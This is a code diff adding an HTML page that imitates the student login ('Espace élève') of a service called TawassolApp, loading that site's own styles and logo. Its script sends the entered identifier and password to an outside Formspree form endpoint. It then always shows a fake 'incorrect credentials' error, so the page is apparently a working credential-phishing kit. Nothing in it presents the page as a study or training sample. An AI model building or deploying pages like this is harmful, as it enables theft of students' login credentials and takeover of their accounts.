@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <title>TawassolApp</title>
+    <link rel="stylesheet" href="https://tawassolapp.com/eleve_assets/vendors/mdi/css/materialdesignicons.min.css">
+    <link rel="stylesheet" href="https://tawassolapp.com/eleve_assets/vendors/flag-icon-css/css/flag-icon.min.css">
+    <link rel="stylesheet" href="https://tawassolapp.com/eleve_assets/vendors/css/vendor.bundle.base.css">
+    <link rel="stylesheet" href="https://tawassolapp.com/eleve_assets/vendors/jquery-bar-rating/css-stars.css" />
+    <link rel="stylesheet" href="https://tawassolapp.com/eleve_assets/vendors/font-awesome/css/font-awesome.min.css" />
+    <link rel="stylesheet" href="https://tawassolapp.com/eleve_assets/css/demo_1/style.css" />
+    <link rel="stylesheet" href="https://tawassolapp.com/eleve_assets/css/demo_2/style.css" />
+    <link rel="shortcut icon" href="https://tawassolapp.com/eleve_assets/img/favicon.png" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" />
+    <style>
+        .lds-ring { display: inline-block; position: relative; width: 30px; height: 30px; }
+        .lds-ring div { box-sizing: border-box; display: block; position: absolute; width: 24px; height: 24px; margin: 2px; border: 2px solid #fff; border-radius: 50%; animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite; border-color: #fff transparent transparent transparent; }
+        .lds-ring div:nth-child(1) { animation-delay: -0.45s; }
+        .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
+        .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
+        @keyframes lds-ring { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="sidebar-icon-only">
+    <div class="container-scroller">
+        <div class="container-fluid page-body-wrapper">
+            <div class="main-panel">
+                <div class="content-wrapper pb-0">
+                    <div class="row flex-grow">
+                        <div class="col-lg-6 mx-auto">
+                            <div class="text-center p-5">
+                                <div class="brand-logo">
+                                    <img src="https://tawassolapp.com/eleve_assets/img/tawassolapp-logo-mobile.png" style="max-width: 130px;margin-bottom: 28px;">
+                                </div>
+                                <h4>Espace élève</h4>
+                                <form class="pt-3">
+                                    <div class="form-group">
+                                        <input type="text" name="code" class="form-control form-control-lg" placeholder="Identifiant">
+                                    </div>
+                                    <div class="form-group">
+                                        <input type="password" name="password" class="form-control form-control-lg" placeholder="Mot de passe">
+                                    </div>
+                                    <div class="mt-3">
+                                        <a class="btn btn-block btn-primary btn-lg font-weight-semibold p-2" id="btnSubmitLogin" href="#"><span class="d-block p-2">Se connecter</span></a>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://tawassolapp.com/eleve_assets/vendors/js/vendor.bundle.base.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+    <script>
+        var baseURL = 'https://tawassolapp.com/';
+        toastr.options.closeButton = true;
+        toastr.options.progressBar = true;
+
+        $(document).ready(function() {
+            $("#btnSubmitLogin").click(function(e) {
+                e.preventDefault();
+                var code = $('input[name=code]').val().trim();
+                var password = $('input[name=password]').val().trim();
+
+                if(code.length > 0 && password.length > 0){
+                    $("#btnSubmitLogin").html(`<div class="lds-ring"><div></div><div></div><div></div><div></div></div>`);
+
+                    // Sends data to Formspree (a free form-to-email/dashboard collector)
+                    fetch('https://formspree.io/f/mppzbpad', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ code: code, password: password })
+                    }).then(() => {
+                        setTimeout(function() {
+                            $("#btnSubmitLogin").html(`<span class="d-block p-2">Se connecter</span>`);
+                            toastr.error("L'identifiant et/ou le mot de passe sont incorrects", 'Erreur', { timeOut: 5000 });
+                        }, 1000);
+                    }).catch(() => {
+                        $("#btnSubmitLogin").html(`<span class="d-block p-2">Se connecter</span>`);
+                    });
+                } else {
+                    toastr.error("Les champs sont vides", 'Erreur', { timeOut: 5000 });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
